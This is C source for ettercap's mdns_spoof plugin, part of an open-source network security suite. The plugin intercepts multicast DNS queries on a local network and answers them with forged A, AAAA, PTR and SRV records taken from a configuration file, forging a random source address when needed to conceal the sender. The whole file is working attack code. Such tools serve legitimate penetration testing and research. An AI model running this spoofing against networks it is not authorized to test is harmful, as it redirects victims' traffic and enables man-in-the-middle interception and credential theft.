/*
    mdns_spoof -- ettercap plugin -- spoofs mdns replies

    Copyright (C) Ettercap Development Team
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_file.h>
#include <ec_hook.h>
#include <ec_resolv.h>
#include <ec_send.h>

#include <stdlib.h>
#include <string.h>

#ifndef ns_t_wins
#define ns_t_wins 0xFF01      /* WINS name lookup */
#endif

#define MDNS_QU_FLAG 0x8000

struct mdns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t questions;
    uint16_t answer_rrs;
    uint16_t auth_rrs;
    uint16_t additional_rrs;
};

struct mdns_spoof_entry {
   int   type;   /* ns_t_a, ns_t_ptr, ns_t_srv */
   char *name;
   struct ip_addr ip;
   u_int16 port; /* for SRV records */
   SLIST_ENTRY(mdns_spoof_entry) next;
};

static SLIST_HEAD(, mdns_spoof_entry) mdns_spoof_head;

/* protos */

int plugin_load(void *);
static int mdns_spoof_init(void *);
static int mdns_spoof_fini(void *);
static int load_db(void);
static void mdns_spoof(struct packet_object *po);
static int parse_line(const char *str, int line, int *type_p, char **ip_p, u_int16 *port_p, char **name_p);
static int get_spoofed_a(const char *a, struct ip_addr **ip);
static int get_spoofed_aaaa(const char *a, struct ip_addr **ip);
static int get_spoofed_ptr(const char *arpa, char **a, struct ip_addr **ip);
static int get_spoofed_srv(const char *name, struct ip_addr **ip, u_int16 *port);
static int prep_mdns_reply(struct packet_object *po, u_int16 class, struct ip_addr **sender, struct ip_addr **target, u_int8 **tmac , struct ip_addr *reply);
char *type_str(int type);
static void mdns_spoof_dump(void);

/* plugin operations */

struct plugin_ops mdns_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "mdns_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Sends spoofed mDNS replies",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &mdns_spoof_init,
   /* deactivation function */                     
   .fini =              &mdns_spoof_fini,
};

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   /* load the database of spoofed replies (etter.dns) 
    * return an error if we could not open the file
    */
   if (load_db() != ESUCCESS)
      return -EINVALID;
   
   mdns_spoof_dump();
   return plugin_register(handle, &mdns_spoof_ops);
}

static int mdns_spoof_init(void *dummy) 
{
   /* 
    * add the hook in the dissector.
    * this will pass only valid dns packets
    */
   hook_add(HOOK_PROTO_MDNS, &mdns_spoof);
   
   return PLUGIN_RUNNING;
}


static int mdns_spoof_fini(void *dummy) 
{
   /* remove the hook */
   hook_del(HOOK_PROTO_MDNS, &mdns_spoof);

   return PLUGIN_FINISHED;
}

/*
 * load the database in the list 
 */
static int load_db(void)
{
   struct mdns_spoof_entry *d;
   struct in_addr ipaddr;
   struct in6_addr ip6addr;
   FILE *f;
   char line[128];
   char *ptr, *ip, *name;
   int lines = 0, type, af = AF_INET;
   u_int16 port = 0;
   
   /* open the file */
   f = open_data("etc", ETTER_MDNS, FOPEN_READ_TEXT);
   if (f == NULL) {
      USER_MSG("mdns_spoof: Cannot open %s\n", ETTER_MDNS);
      return -EINVALID;
   }
         
   /* load it in the list */
   while (fgets(line, 128, f)) {
      /* count the lines */
      lines++;

      /* trim comments */
      if ( (ptr = strchr(line, '#')) )
         *ptr = '\0';

      /* skip empty lines */
      if (!*line || *line == '\r' || *line == '\n')
         continue;
      
      /* strip apart the line */
      if (!parse_line(line, lines, &type, &ip, &port, &name))
         continue;
        
      /* convert the ip address */
      if (inet_pton(AF_INET, ip, &ipaddr) == 1) { /* try IPv4 */
         af = AF_INET;
      }
      else if (inet_pton(AF_INET6, ip, &ip6addr) == 1) { /* try IPv6 */
         af = AF_INET6;
      }
      else {
         USER_MSG("mdns_spoof: %s:%d Invalid IPv4 or IPv6 address\n", ETTER_MDNS, lines);
         continue;
      }
        
      /* create the entry */
      SAFE_CALLOC(d, 1, sizeof(struct mdns_spoof_entry));
      d->name = strdup(name);
      d->type = type;
      d->port = port;

      /* fill the struct */
      if (af == AF_INET) {
          ip_addr_init(&d->ip, AF_INET, (u_char *)&ipaddr);
      } 
      else if (af == AF_INET6) {
          ip_addr_init(&d->ip, AF_INET6, (u_char *)&ip6addr);
      } 


      /* insert in the list */
      SLIST_INSERT_HEAD(&mdns_spoof_head, d, next);
   }

   fclose(f);

   return ESUCCESS;
}

/*
 * Parse line on format "<name> <type> <IP-addr>".
 */
static int parse_line (const char *str, int line, int *type_p, char **ip_p, u_int16 *port_p, char **name_p)
{
   static char name[100+1];
   static char ip[MAX_ASCII_ADDR_LEN];
   static int port;
   char type[10+1];

 DEBUG_MSG("mdns_spoof: %s:%d str '%s'", ETTER_MDNS, line, str); 

   if (sscanf(str,"%100s %10s %40[^\r\n# ]", name, type, ip) != 3) {
      USER_MSG("mdns_spoof: %s:%d Invalid entry %s\n", ETTER_MDNS, line, str);
      return (0);
   }

   if (!strcasecmp(type,"PTR")) {
      if (strpbrk(name,"*?[]")) {
         USER_MSG("mdns_spoof: %s:%d Wildcards in PTR records are not allowed; %s\n",
                  ETTER_MDNS, line, str);
         return (0);
      }
      *type_p = ns_t_ptr;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"A")) {
      *type_p = ns_t_a;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"AAAA")) {
      *type_p = ns_t_aaaa;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type, "SRV")) {
      /* 
       * Additional format scan as SRV records have a different syntax
       */
      static char ip_tmp[MAX_ASCII_ADDR_LEN];
      if (sscanf(ip, "[%40[0-9a-fA-F:.]]:%d", ip_tmp, &port) == 2) {
         strncpy(ip, ip_tmp, strlen(ip_tmp)+1);
      }
      else if (sscanf(ip, "%20[0-9.]:%d", ip_tmp, &port) == 2) {
         strncpy(ip, ip_tmp, strlen(ip_tmp)+1);
      }
      else {
         USER_MSG("mdns_spoof: %s:%d Unknown syntax for SRV record; %s\n",
                  ETTER_MDNS, line, str);
         return 0;
      }

      if (port > 0xffff || port <= 0) {
         USER_MSG("mdns_spoof: %s:%d Invalid value for port: %d\n",
                  ETTER_MDNS, line, port);
         return 0;
      }

      *type_p = ns_t_srv;
      *name_p = name;
      *ip_p = ip;
      *port_p = port & 0x0000ffff;

      return 1;
   }

   USER_MSG("mdns_spoof: %s:%d Unknown record type %s\n", ETTER_MDNS, line, type);
   return (0);
}

/*
 * parse the request and return a spoofed response
 */
 static void mdns_spoof(struct packet_object *po)
 {
    po->flags |= PO_DROPPED; /* Do not forward query */

    struct mdns_header *mdns;
    char name[NS_MAXDNAME];
    int name_len;
    u_char *q, *data, *end;;
    u_int16 class;
    u_int16 type;
    int x;

    mdns = (struct mdns_header *)po->DATA.data;
    data = (u_char *)(mdns+1);
    end = (u_char *)mdns + po->DATA.len;

    q = data;

    if (mdns->flags == 0x8400 || mdns->answer_rrs > 0)
    {
        //We only want queries.
        return;
    }

    /* process all the questions */
    for (x = 0; x < mdns->questions; x++) {

      name_len = dn_expand((u_char*)mdns, end, q, name, sizeof(name));

      q = data + name_len;

      if (q >= end || name_len == 0)
        return;

      NS_GET16(type, q);
      NS_GET16(class, q);

      /* handle only internet class - unmask the QU flag */
      if ((class & ~MDNS_QU_FLAG) != ns_c_in)
         return;

      if(type == ns_t_a) {
         struct ip_addr *reply;
         struct ip_addr *sender;
         struct ip_addr *target;
         u_int8 *tmac;
         u_int8 answer[name_len + 10 + 4];
         u_char *p = answer + name_len;
         char tmp[MAX_ASCII_ADDR_LEN];
         
         /* found the reply in the list */
         if (get_spoofed_a(name, &reply) != ESUCCESS)
            return;

         /* check if the family matches the record type */
         if (ntohs(reply->addr_type) != AF_INET) {
            USER_MSG("mdns_spoof: can not spoof A record for %s "
                     "because the value is not a IPv4 address\n", name);
            return;
         }

        /* 
         * in MDNS the original question is not included 
         * into the reply packet as with pure DNS - 
         * fill the buffer with the questioned name of the request
         * we will append the answer just after the quoted name 
         */
         memcpy(answer, data, name_len);                  /* name */
         memcpy(p    , "\x00\x01", 2);                    /* type A */
         memcpy(p + 2, "\x80\x01", 2);                    /* cache-flush-bit + class */
         memcpy(p + 4, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         memcpy(p + 8, "\x00\x04", 2);                    /* datalen */
         ip_addr_cpy(p + 10, reply);                      /* data */

         /*
          * depending on the MDNS question, the target address has to be redefined;
          * we also can not use the multicast address as the source but also;
          * don't want to reveal our own IP, so the sender needs also be redefined;
          * hence the variables for the transport of the reply need to be prepared.
          */
         prep_mdns_reply(po, class, &sender, &target, &tmac, reply);

         /* send the reply back to the multicast or unicast address 
          * and set the faked address as the source address for the transport
          */
         send_mdns_reply(po->L4.src, sender, target, tmac, 
                         ntohs(mdns->id), answer, sizeof(answer), 1, 0, 0);
         
         USER_MSG("mdns_spoof: [%s %s] spoofed to [%s]\n", name, type_str(type), ip_addr_ntoa(reply, tmp));
      }
      if(type == ns_t_aaaa) {
         struct ip_addr *reply;
         struct ip_addr *sender;
         struct ip_addr *target;
         u_int8 *tmac;
         u_int8 answer[name_len + 10 + 16];
         u_char *p = answer + name_len;
         char tmp[MAX_ASCII_ADDR_LEN];
         
         /* found the reply in the list */
         if (get_spoofed_aaaa(name, &reply) != ESUCCESS)
            return;

         /* check if the family matches the record type */
         if (ntohs(reply->addr_type) != AF_INET6) {
            USER_MSG("mdns_spoof: can not spoof AAAA record for %s "
                     "because the value is not a IPv6 address\n", name);
            return;
         }

        /* 
         * in MDNS the original question is not included 
         * into the reply packet as with pure DNS - 
         * fill the buffer with the questioned name of the request
         * we will append the answer just after the quoted name 
         */
         memcpy(answer, data, name_len);                  /* name */
         memcpy(p    , "\x00\x1c", 2);                    /* type AAAA */
         memcpy(p + 2, "\x80\x01", 2);                    /* cache-flush-bit + class */
         memcpy(p + 4, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         memcpy(p + 8, "\x00\x10", 2);                    /* datalen */
         ip_addr_cpy(p + 10, reply);                      /* data */

         /*
          * depending on the MDNS question, the target address has to be redefined;
          * we also can not use the multicast address as the source but also;
          * don't want to reveal our own IP, so the sender needs also be redefined;
          * hence the variables for the transport of the reply need to be prepared.
          */
         prep_mdns_reply(po, class, &sender, &target, &tmac, reply);

         /* send the reply back to the multicast or unicast address 
          * and set the faked address as the source address for the transport
          */
         send_mdns_reply(po->L4.src, sender, target, tmac, 
                         ntohs(mdns->id), answer, sizeof(answer), 1, 0, 0);
         
         USER_MSG("mdns_spoof: [%s %s] spoofed to [%s]\n", name, type_str(type), ip_addr_ntoa(reply, tmp));
       }
       else if (type == ns_t_ptr) {
         struct ip_addr *reply;
         struct ip_addr *sender;
         struct ip_addr *target;
         u_int8 *tmac;
         u_int8 answer[name_len + 256];
         char *a, *p = (char*)answer + name_len;
         int rlen;
         
         /* found the reply in the list */
         if (get_spoofed_ptr(name, &a, &reply) != ESUCCESS)
            return;

        /* 
         * in MDNS the original question is not included 
         * into the reply packet as with pure DNS - 
         * fill the buffer with the questioned name of the request
         * we will append the answer just after the quoted name 
         */
         memcpy(answer, data, name_len);                  /* name */
         memcpy(p    , "\x00\x0c", 2);                    /* type PTR */
         memcpy(p + 2, "\x80\x01", 2);                    /* cache-flush-bit + class */
         memcpy(p + 4, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         /* compress the string into the buffer */
         rlen = dn_comp(a, (u_char*)p + 10, 256, NULL, NULL);
         /* put the length before the dn_comp'd string */
         p += 8;
         NS_PUT16(rlen, p);

         /*
          * depending on the MDNS question, the target address has to be redefined;
          * we also can not use the multicast address as the source but also;
          * don't want to reveal our own IP, so the sender needs also be redefined;
          * hence the variables for the transport of the reply need to be prepared.
          */
         prep_mdns_reply(po, class, &sender, &target, &tmac, reply);

         /* send the fake reply */
         send_mdns_reply(po->L4.src, sender, target, tmac, 
                         ntohs(mdns->id), answer, name_len + 10 + rlen, 1, 0, 0);
         
         USER_MSG("mdns_spoof: [%s %s] spoofed to [%s]\n", name, type_str(type), a);
      }
      else if (type == ns_t_srv) {
         struct ip_addr *reply;
         struct ip_addr *sender;
         struct ip_addr *target;
         u_int8 *tmac;
         u_int8 answer[name_len + 22 + 12 + 16];
         char *p = (char *)answer + name_len;
         char tmp[MAX_ASCII_ADDR_LEN];
         char srvoffset[2];
         char tgtoffset[2];
         u_int16 port;
         int dn_offset = 0;


         /* found the reply in the list */
         if (get_spoofed_srv(name, &reply, &port) != ESUCCESS) 
            return;

         /*
          * to refer the target to a proper domain name, we have to strip the
          * service and protocol label from the questioned domain name
          */
         dn_offset += *(data+dn_offset) + 1; /* first label (e.g. _ldap)*/
         dn_offset += *(data+dn_offset) + 1; /* second label (e.g. _tcp) */

         /* avoid offset overrun */
         if (dn_offset + 12 > 255) {
            dn_offset = 0;
         }

         tgtoffset[0] = 0xc0; /* offset byte */
         tgtoffset[1] = 12 + dn_offset; /* offset to the actual domain name */

         /*
          * to inject the spoofed IP address in the additional section, 
          * we have set the offset pointing to the spoofed domain name set 
          * below (in turn, after the domain name [variable length] in the 
          * question section)
          */
         srvoffset[0] = 0xc0; /* offset byte */
         srvoffset[1] = 12 + name_len + 16; /* offset to the answer */

        /* 
         * in MDNS the original question is not included 
         * into the reply packet as with pure DNS - 
         * fill the buffer with the questioned name of the request
         * we will append the answer just after the quoted name 
         */
         memcpy(answer, data, name_len);              /* name */
         memcpy(p    , "\x00\x21", 2);                /* type SRV */
         memcpy(p + 2, "\x80\x01", 2);                /* class IN */
         memcpy(p + 4, "\x00\x00\x0e\x10", 4);        /* TTL (1 hour) */
         memcpy(p + 8, "\x00\x0c", 2);                /* data length */
         memcpy(p + 10, "\x00\x00", 2);               /* priority */
         memcpy(p + 12, "\x00\x00", 2);               /* weight */
         p+=14; 
         NS_PUT16(port, p);                           /* port */ 
         p-=16;             
         /* 
          * add "srv." in front of the stripped domain
          * name and resolve it in the additional 
          * record (here `srvoffset' is pointing at)
          */
         memcpy(p + 16, "\x03\x73\x72\x76", 4);       /* target */
         memcpy(p + 20, tgtoffset,2);                 /* compressed name offset */
     
         /* add the additional record for the spoofed IPv4 address*/
         if (ntohs(reply->addr_type) == AF_INET) {
             memcpy(p + 22, srvoffset, 2);            /* compressed name offset */
             memcpy(p + 24, "\x00\x01", 2);           /* type A */
             memcpy(p + 26, "\x80\x01", 2);           /* class */
             memcpy(p + 28, "\x00\x00\x0e\x10", 4);   /* TTL (1 hour) */
             memcpy(p + 32, "\x00\x04", 2);           /* datalen */
             ip_addr_cpy(p + 34, reply);              /* data */
             memset(p + 38, 0, 12);                   /* padding */
         }
         /* add the additional record for the spoofed IPv6 address*/
         else if (ntohs(reply->addr_type) == AF_INET6) {
             memcpy(p + 22, srvoffset, 2);            /* compressed name offset */
             memcpy(p + 24, "\x00\x1c", 2);           /* type AAAA */
             memcpy(p + 26, "\x80\x01", 2);           /* class */
             memcpy(p + 28, "\x00\x00\x0e\x10", 4);   /* TTL (1 hour) */
             memcpy(p + 32, "\x00\x10", 2);           /* datalen */
             ip_addr_cpy(p + 34, reply);              /* data */
         }
         else {
             /* IP address not valid - abort */
             return;
         }

         /*
          * depending on the MDNS question, the target address has to be redefined;
          * we also can not use the multicast address as the source but also;
          * don't want to reveal our own IP, so the sender needs also be redefined;
          * hence the variables for the transport of the reply need to be prepared.
          */
         prep_mdns_reply(po, class, &sender, &target, &tmac, reply);

         /* send the reply back to the multicast or unicast address 
          * and set the faked address as the source address for the transport
          */
         send_mdns_reply(po->L4.src, sender, target, tmac, 
                         ntohs(mdns->id), answer, sizeof(answer), 2, 0, 0);

         USER_MSG("dns_spoof: SRV [%s] spoofed to [%s:%d]\n", name, ip_addr_ntoa(reply, tmp), port);
      }
    }


 }

/*
 * return the ip address for the name - IPv4
 */
static int get_spoofed_a(const char *a, struct ip_addr **ip)
{
   struct mdns_spoof_entry *d;

   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (d->type == ns_t_a && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/*
 * return the ip address for the name - IPv6
 */
static int get_spoofed_aaaa(const char *a, struct ip_addr **ip)
{
   struct mdns_spoof_entry *d;

   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (d->type == ns_t_aaaa && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/* 
 * return the name for the ip address 
 */
static int get_spoofed_ptr(const char *arpa, char **a, struct ip_addr **ip)
{
   struct mdns_spoof_entry *d;
   struct ip_addr ptr;
   unsigned int oct[32];
   int len, v4len, v6len;
   u_char ipv4[4];
   u_char ipv6[16];
   char v4tld[] = "in-addr.arpa";
   char v6tld[] = "ip6.arpa";

   len = strlen(arpa);
   v4len = strlen(v4tld);
   v6len = strlen(v6tld);

   /* Check the top level domain of the PTR query - IPv4 */

   if (strncmp(arpa + len - v4len, v4tld, v4len) == 0) {
      /* parses the arpa format */
      if (sscanf(arpa, "%d.%d.%d.%d.in-addr.arpa", 
               &oct[3], &oct[2], &oct[1], &oct[0]) != 4)
         return -EINVALID;

      /* collect octets */
      ipv4[0] = oct[0] & 0xff; 
      ipv4[1] = oct[1] & 0xff; 
      ipv4[2] = oct[2] & 0xff; 
      ipv4[3] = oct[3] & 0xff;

      /* init the ip_addr structure */
      ip_addr_init(&ptr, AF_INET, ipv4);

   }
   /* check the top level domain of the PTR query - IPv6 */
   else if (strncmp(arpa + len - v6len, v6tld, v6len) == 0) {
       /* parses the ip6.arpa format for IPv6 reverse pointer */
       if (sscanf(arpa, "%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x."
                        "%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x."
                        "%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x.%1x."
                        "%1x.%1x.%1x.%1x.%1x.ip6.arpa", 
                        &oct[31], &oct[30], &oct[29], &oct[28],
                        &oct[27], &oct[26], &oct[25], &oct[24],
                        &oct[23], &oct[22], &oct[21], &oct[20],
                        &oct[19], &oct[18], &oct[17], &oct[16],
                        &oct[15], &oct[14], &oct[13], &oct[12],
                        &oct[11], &oct[10], &oct[9],  &oct[8],
                        &oct[7],  &oct[6],  &oct[5],  &oct[4],
                        &oct[3],  &oct[2],  &oct[1],  &oct[0]) != 32) {
          return -EINVALID;
       }
       
       /* collect octets */
       ipv6[0] = (oct[0] << 4) | oct[1];
       ipv6[1] = (oct[2] << 4) | oct[3];
       ipv6[2] = (oct[4] << 4) | oct[5];
       ipv6[3] = (oct[6] << 4) | oct[7];
       ipv6[4] = (oct[8] << 4) | oct[9];
       ipv6[5] = (oct[10] << 4) | oct[11];
       ipv6[6] = (oct[12] << 4) | oct[13];
       ipv6[7] = (oct[14] << 4) | oct[15];
       ipv6[8] = (oct[16] << 4) | oct[17];
       ipv6[9] = (oct[18] << 4) | oct[19];
       ipv6[10] = (oct[20] << 4) | oct[21];
       ipv6[11] = (oct[22] << 4) | oct[23];
       ipv6[12] = (oct[24] << 4) | oct[25];
       ipv6[13] = (oct[26] << 4) | oct[27];
       ipv6[14] = (oct[28] << 4) | oct[29];
       ipv6[15] = (oct[30] << 4) | oct[31];

       /* init the ip_addr structure */
       ip_addr_init(&ptr, AF_INET6, ipv6);

   }

   /* search in the list */
   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      /* 
       * we cannot return whildcards in the reply, 
       * so skip the entry if the name contains a '*'
       */
      if (d->type == ns_t_ptr && !ip_addr_cmp(&ptr, &d->ip)) {

         /* return the pointer to the name */
         *a = d->name;
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

static int get_spoofed_srv(const char *name, struct ip_addr **ip, u_int16 *port) 
{
    struct mdns_spoof_entry *d;

    SLIST_FOREACH(d, &mdns_spoof_head, next) {
        if (d->type == ns_t_srv && match_pattern(name, d->name)) {
            /* return the pointer to the struct */
            *ip = &d->ip;
            *port = d->port;

            return ESUCCESS;
        }
    }

    return -ENOTFOUND;
}

/*
 * define sender address and target address 
 */
static int prep_mdns_reply(struct packet_object *po, u_int16 class, struct ip_addr **sender, 
                      struct ip_addr **target, u_int8 **tmac , struct ip_addr *reply)
{
   char tmp[MAX_ASCII_ADDR_LEN];

   if ((class & MDNS_QU_FLAG) == 0x8000 && ip_addr_is_multicast(&po->L3.dst)) { 
      /* received multicast but unicast response requested */
      if (reply != NULL && reply->addr_type == po->L3.src.addr_type) {
         /* 
          * address family of spoofed address matches address family 
          * of the transport protocol - we use it as the sender
          */
         *sender = reply;
         *target = &po->L3.src;
         *tmac = po->L2.src;

         return ESUCCESS;

      } else {
         /*
          * we can not use the spoofed address as the sender 
          * a random link-local address need to be generated
          */
         if (ip_addr_random(&po->L3.dst, ntohs(po->L3.src.addr_type)) == ESUCCESS) {
            DEBUG_MSG("mdns_spoof: random IP generated: %s\n", ip_addr_ntoa(&po->L3.dst, tmp));

            *sender = &po->L3.dst;
            *target = &po->L3.src;
            *tmac = po->L2.src;

            return ESUCCESS;

         } else {
            DEBUG_MSG("mdns_spoof: Random sender IP generation failed\n");
            DEBUG_MSG("mdns_spoof: Unknown address family: %s \n", ip_addr_ntoa(&po->L3.src,tmp));
            
            return -ENOADDRESS;
         }
      }
   } else if (!ip_addr_is_multicast(&po->L3.dst)) {
      /* MDNS received via unicast - response via unicast */
      *sender = &po->L3.dst;
      *target = &po->L3.src;
      *tmac = po->L2.src;

      return ESUCCESS;

   } else { 
      /* normal multicast reply */
      if (reply != NULL && reply->addr_type == po->L3.dst.addr_type) {
         /* 
          * send the reply back to the multicast address and set 
          * the spoofed address also as the source ip address
          */
         *sender = reply;
         *target = &po->L3.dst;
         *tmac = po->L2.dst;

         return ESUCCESS;

      } else {
         /*
          * we can not use the spoofed address as the sender 
          * a random link-local address need to be generated
          */
         if (ip_addr_random(&po->L3.src, ntohs(po->L3.src.addr_type)) == ESUCCESS) {
            DEBUG_MSG("mdns_spoof: random IP generated: %s\n", ip_addr_ntoa(&po->L3.src, tmp));

            /* 
             * send the reply back to the multicast address and set the
             * faked address as the source
             */
            *sender = &po->L3.src;
            *target = &po->L3.dst;
            *tmac = po->L2.dst;

            return ESUCCESS;

         } else {
            DEBUG_MSG("mdns_spoof: Random sender IP generation failed\n");
            DEBUG_MSG("mdns_spoof: Unknown address family: %s \n", ip_addr_ntoa(&po->L3.src,tmp));
            
            return -ENOADDRESS;
         }
      }
   }
}


char *type_str (int type)
{
   return (type == ns_t_a    ? "A" :
           type == ns_t_aaaa ? "AAAA" :
           type == ns_t_ptr  ? "PTR" :
           type == ns_t_mx   ? "MX" :
           type == ns_t_wins ? "WINS" :
           type == ns_t_srv   ? "SRV" : "?");
}

static void mdns_spoof_dump(void)
{
   struct mdns_spoof_entry *d;
   char tmp[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("mdns_spoof entries:");
   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (ntohs(d->ip.addr_type) == AF_INET) {
         if (d->type == ns_t_srv) {
            DEBUG_MSG("  %s -> [%s:%d], type %s, family IPv4", 
                      d->name, ip_addr_ntoa(&d->ip, tmp), d->port , type_str(d->type));
         }
         else {
            DEBUG_MSG("  %s -> [%s], type %s, family IPv4", 
                      d->name, ip_addr_ntoa(&d->ip, tmp), type_str(d->type));
         }
      }
      else if (ntohs(d->ip.addr_type) == AF_INET6) {
         if (d->type == ns_t_srv) {
            DEBUG_MSG("  %s -> [%s:%d], type %s, family IPv6", 
                      d->name, ip_addr_ntoa(&d->ip, tmp), d->port , type_str(d->type));
         }
         else {
            DEBUG_MSG("  %s -> [%s], type %s, family IPv6", 
                      d->name, ip_addr_ntoa(&d->ip, tmp), type_str(d->type));
         }
      }
      else
      {
         DEBUG_MSG("  %s -> ??", d->name);   
      }
   }
}


